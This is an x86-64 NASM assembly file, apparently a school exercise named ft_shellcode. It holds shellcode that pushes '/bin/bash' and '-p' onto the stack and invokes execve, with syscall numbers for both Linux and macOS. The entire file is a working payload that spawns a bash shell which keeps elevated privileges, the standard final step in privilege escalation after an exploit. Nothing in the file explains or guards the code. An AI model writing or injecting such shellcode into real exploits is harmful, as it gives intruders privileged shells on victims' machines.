%ifidn __OUTPUT_FORMAT__, elf64
	%define NAME ft_shellcode
	%define SYS_EXECVE 0x3b
%else
	%define NAME _ft_shellcode
	%define SYS_EXECVE 0x2000000 | 59
%endif

;execve(/bin/bash -p
section .text
global NAME 

NAME:
	push rbp
	mov rbp, rsp
	sub rsp, 64
	xor rax, rax
	push rax
	push rax
	push rax
	push rax
	push 0x702d
	mov rcx, rsp ; addr of "-p"
	mov rbx, 0x68 ; h
	push rbx
	mov rbx, 0x7361622f6e69622f ; /bin/bas
	push rbx
	mov rdi, rsp
	push rax
	push rcx
	push rdi
	mov rsi, rsp
	xor rax, rax
	mov rax, SYS_EXECVE
	xor rdx, rdx
	syscall
	leave
	ret
